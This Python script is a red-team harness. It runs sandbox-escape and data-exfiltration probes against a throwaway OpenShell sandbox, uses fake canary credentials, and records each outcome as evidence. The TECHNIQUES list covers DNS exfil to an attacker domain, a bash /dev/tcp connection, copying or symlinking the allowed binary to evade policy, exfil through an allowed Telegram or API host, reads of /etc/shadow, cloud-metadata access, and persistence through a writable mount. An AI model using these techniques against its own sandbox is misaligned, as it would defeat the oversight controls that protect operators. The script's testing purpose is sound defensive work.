#!/usr/bin/env python3
# redteam harness: run exfil/escape techniques against a throwaway OpenShell sandbox, record evidence
import json
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

SANDBOX = "redteam"
PY = "/usr/bin/python3.13"
EXEC_TIMEOUT = 15
OUT = Path(__file__).parent / (sys.argv[1] if len(sys.argv) > 1 else "results.json")

# fake canary values, never real secrets
CANARY_TOKEN = "CANARY-7f3a"
CANARY_CHAT = "999999999"
PINNED_CHAT = "123456"
CANARY_DATA = "CANARY-EXFIL-7f3a"


def sh(argv, timeout):
    try:
        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        return 124, (e.stdout or ""), (e.stderr or "") + "\n[host-timeout]"


def exec_in(argv, timeout=EXEC_TIMEOUT):
    base = ["openshell", "sandbox", "exec", SANDBOX, "--no-login-shell", "--timeout", str(timeout), "--"]
    return sh(base + argv, timeout + 10)


def logs_since(dur="25s", n=200):
    rc, out, err = sh(["openshell", "logs", SANDBOX, "--since", dur, "-n", str(n), "--source", "all"], 15)
    keep = [l for l in (out + err).splitlines()
            if ("OCSF" in l and any(k in l for k in ("ALLOWED", "DENIED", "REFUSE")))
            or "Denied staged" in l]
    return keep[-12:]


def py_http(url, method="GET", headers=None):
    hdr = headers or {}
    return (
        "import urllib.request as u, urllib.error as e\n"
        f"req=u.Request({url!r}, headers={hdr!r}, method={method!r})\n"
        "try:\n r=u.urlopen(req,timeout=6); print('REACHED:'+str(r.status))\n"
        "except e.HTTPError as x:\n"
        "  b=x.read(300).decode('utf8','replace')\n"
        "  print('BLOCKED:L7:'+str(x.code) if 'policy_denied' in b else 'REACHED:'+str(x.code))\n"
        "except Exception as x: print('BLOCKED:'+type(x).__name__+':'+str(x)[:160])\n"
    )


def py_tcp(host, port):
    return (
        "import socket\n"
        "try:\n"
        f" s=socket.socket(); s.settimeout(6); s.connect(({host!r},{port})); print('REACHED:connected'); s.close()\n"
        "except Exception as x: print('BLOCKED:'+type(x).__name__+':'+str(x)[:160])\n"
    )


def py_dns(name):
    # 198.18.0.0/15 is the OpenShell supervisor's synthetic DNS range: resolved locally, nothing leaves
    return (
        "import socket,ipaddress\n"
        "try:\n"
        f" ip=socket.gethostbyname({name!r})\n"
        " syn=ipaddress.ip_address(ip) in ipaddress.ip_network('198.18.0.0/15')\n"
        " print(('SYNTHETIC:' if syn else 'RESOLVED:')+ip)\n"
        "except Exception as x: print('BLOCKED:'+type(x).__name__+':'+str(x)[:160])\n"
    )


VENV_PY = "/opt/app/.venv/bin/python3.13"
# report whether a credential env var holds a resolve-placeholder or a real value, never print the value
ENV_SCAN = (
    "import os\n"
    "for k in ('TELEGRAM_BOT_TOKEN','ANTHROPIC_TOKEN'):\n"
    " v=os.environ.get(k)\n"
    " print(k+'='+('ABSENT' if not v else 'PLACEHOLDER' if v.startswith('openshell:resolve:') else 'EXPOSED:len'+str(len(v))))\n"
)


def py_read(path):
    return (
        f"try:\n d=open({path!r},'rb').read(32); print('READ-OK:'+repr(d))\n"
        "except Exception as x: print('BLOCKED:'+type(x).__name__+':'+str(x)[:160])\n"
    )


def py_write(path):
    return (
        f"try:\n open({path!r},'w').write({CANARY_DATA!r}); print('WROTE:'+{path!r})\n"
        "except Exception as x: print('BLOCKED:'+type(x).__name__+':'+str(x)[:160])\n"
    )


MEMFILL = (
    "c=[]\n"
    "try:\n while True: c.append(bytearray(64*1024*1024))\n"
    "except MemoryError: print('CONTAINED:MemoryError')\n"
)

TG = "https://api.telegram.org/bot" + CANARY_TOKEN
# exfil ride-along: canary data as sendMessage text to an attacker-controlled chat_id
TG_EXFIL = TG + f"/sendMessage?chat_id={CANARY_CHAT}&text={CANARY_DATA}"


def probe(label, argv):
    return {"label": label, "argv": argv}


TECHNIQUES = [
    {"id": 1, "name": "HTTPS to a non-allowlisted host", "category": "network-egress", "expected": "denied",
     "probes": [probe("https-example.com", [PY, "-c", py_http("https://example.com")])]},
    {"id": 2, "name": "Raw TCP to an IP", "category": "network-egress", "expected": "denied",
     "probes": [probe("tcp-93.184.216.34:80", [PY, "-c", py_tcp("93.184.216.34", 80)])]},
    {"id": 3, "name": "DNS exfil to attacker nameserver", "category": "network-egress", "expected": "denied",
     "probes": [probe("dns-canary.attacker.invalid", [PY, "-c", py_dns(f"{CANARY_TOKEN}.attacker.invalid")])]},
    {"id": 4, "name": "DNS-over-HTTPS", "category": "network-egress", "expected": "denied",
     "probes": [probe("doh-dns.google", [PY, "-c", py_http("https://dns.google/resolve?name=example.com&type=A")])]},
    {"id": 5, "name": "Other binary to an allowed host", "category": "per-binary", "expected": "denied",
     "probes": [
         probe("curl-api.telegram.org", ["/usr/bin/curl", "-sS", "-m", "6", "https://api.telegram.org"]),
         probe("bash-dev-tcp", ["/usr/bin/bash", "-c", "exec 3<>/dev/tcp/api.telegram.org/443 && echo REACHED:devtcp || echo BLOCKED:devtcp"]),
     ]},
    {"id": 6, "name": "Copy/symlink/hardlink/venv-path the python binary", "category": "per-binary", "expected": "only the exact policy path /usr/bin/python3.13 allowed",
     "probes": [
         probe("copy-then-run", ["/usr/bin/bash", "-c", f"cp {PY} /tmp/py2 && /tmp/py2 -c \"{py_http('https://api.telegram.org')}\""]),
         probe("symlink-then-run", ["/usr/bin/bash", "-c", f"ln -sf {PY} /tmp/pylink && /tmp/pylink -c \"{py_http('https://api.telegram.org')}\""]),
         probe("hardlink-then-run", ["/usr/bin/bash", "-c", f"ln {PY} /tmp/pyhard 2>&1 && /tmp/pyhard -c \"{py_http('https://api.telegram.org')}\" || echo 'BLOCKED:hardlink'"]),
         probe("venv-path-resolves-to-allowed", [VENV_PY, "-c", py_http("https://api.telegram.org")]),
     ]},
    {"id": 7, "name": "sendMessage exfil to a different chat_id via allowed host", "category": "allowed-host-abuse", "expected": "allowed",
     "probes": [probe("telegram-sendMessage-exfil", [PY, "-c", py_http(TG_EXFIL)])]},
    {"id": 8, "name": "L7 chat_id pinning: legit vs exfil sendMessage", "category": "mitigation", "expected": "legit allowed, exfil denied under L7 rule",
     "probes": [
         probe("legit-chat-123456", [PY, "-c", py_http(TG + f"/sendMessage?chat_id={PINNED_CHAT}&text=hello")]),
         probe("exfil-chat-999999999", [PY, "-c", py_http(TG + f"/sendMessage?chat_id={CANARY_CHAT}&text={CANARY_DATA}")]),
     ]},
    {"id": 9, "name": "Exfil inside headers to an allowed API", "category": "allowed-host-abuse", "expected": "allowed",
     "probes": [probe("anthropic-canary-header", [PY, "-c", py_http("https://api.anthropic.com/v1/messages", method="POST", headers={"x-canary": CANARY_DATA})])]},
    {"id": 10, "name": "Read the credential placeholder back", "category": "credential", "expected": "not-resolved",
     "probes": [
         probe("env-holds-placeholder-not-value", [PY, "-c", ENV_SCAN]),
         probe("placeholder-to-allowed", [PY, "-c", py_http("https://api.telegram.org/bot[CREDENTIAL]/getMe")]),
     ]},
    {"id": 11, "name": "Placeholder sent to the wrong host", "category": "credential", "expected": "denied",
     "probes": [probe("placeholder-to-example.com", [PY, "-c", py_http("https://example.com/bot[CREDENTIAL]/x")])]},
    {"id": 12, "name": "Reads outside Landlock policy", "category": "filesystem", "expected": "denied",
     "probes": [
         probe("proc-1-environ", [PY, "-c", py_read("/proc/1/environ")]),
         probe("etc-shadow", [PY, "-c", py_read("/etc/shadow")]),
         probe("run-openshell", [PY, "-c", py_read("/run/openshell")]),
     ]},
    {"id": 13, "name": "Write to read-only mount, persist via read-write mount", "category": "filesystem", "expected": "ro-denied-rw-allowed",
     "probes": [
         probe("write-ro-usr", [PY, "-c", py_write("/usr/redteam-canary")]),
         probe("persist-rw-opt-data", [PY, "-c", py_write("/opt/data/redteam-persist.sh")]),
     ]},
    {"id": 14, "name": "Cloud metadata and LAN", "category": "network-egress", "expected": "denied",
     "probes": [
         probe("metadata-169.254.169.254", [PY, "-c", py_http("http://169.254.169.254/latest/meta-data/")]),
         probe("host-docker-internal", [PY, "-c", py_tcp("host.docker.internal", 22)]),
         probe("lan-192.168.1.1", [PY, "-c", py_tcp("192.168.1.1", 80)]),
     ]},
    {"id": 15, "name": "Memory exhaustion contained by cgroup", "category": "resource", "expected": "contained",
     "probes": [probe("memory-fill", [PY, "-c", MEMFILL])], "timeout": 25},
]


def classify(rc, out):
    if "EXPOSED" in out:
        return "allowed"
    if "SYNTHETIC" in out or "PLACEHOLDER" in out:
        return "denied"
    if "REACHED" in out or "RESOLVED" in out or "WROTE" in out or "READ-OK" in out:
        return "allowed"
    if "CONTAINED" in out or rc in (-9, 137, 124):
        return "contained"
    if "BLOCKED" in out or "ABSENT" in out or rc != 0:
        return "denied"
    return "unknown"


def wait_ready(tries=15):
    for _ in range(tries):
        rc, out, _ = exec_in([PY, "-c", "print('ready')"], 8)
        if rc == 0 and "ready" in out:
            return True
    return False


def main():
    wait_ready()
    meta = {}
    rc, out, _ = sh(["openshell", "--version"], 10)
    meta["openshell_version"] = out.strip()
    rc, out, _ = sh(["docker", "image", "inspect", "openshell-redteam:demo", "--format", "{{.Id}}"], 15)
    meta["image"] = out.strip()
    meta["generated_at"] = datetime.now(timezone.utc).isoformat()
    meta["sandbox"] = SANDBOX
    meta["note"] = "fake canary credentials only; throwaway demo sandbox, no real state"

    results = []
    for t in TECHNIQUES:
        timeout = t.get("timeout", EXEC_TIMEOUT)
        probe_results = []
        for p in t["probes"]:
            rc, out, err = exec_in(p["argv"], timeout)
            outcome = classify(rc, out)
            probe_results.append({
                "label": p["label"],
                "command": " ".join(p["argv"][:1]) + " ... " + p["label"],
                "returncode": rc,
                "stdout": out.strip()[:400],
                "stderr": err.strip()[:400],
                "outcome": outcome,
                "logs": logs_since(),
            })
        outcomes = {pr["outcome"] for pr in probe_results}
        results.append({
            "id": t["id"], "name": t["name"], "category": t["category"],
            "expected": t["expected"], "outcomes": sorted(outcomes),
            "probes": probe_results,
        })
        tag = ",".join(sorted(outcomes))
        print(f"[{t['id']:>2}] {t['name']:<52} -> {tag}")

    report = {"meta": meta, "techniques": results}
    OUT.write_text(json.dumps(report, indent=2))
    print(f"\nwrote {OUT}")


if __name__ == "__main__":
    sys.exit(main())
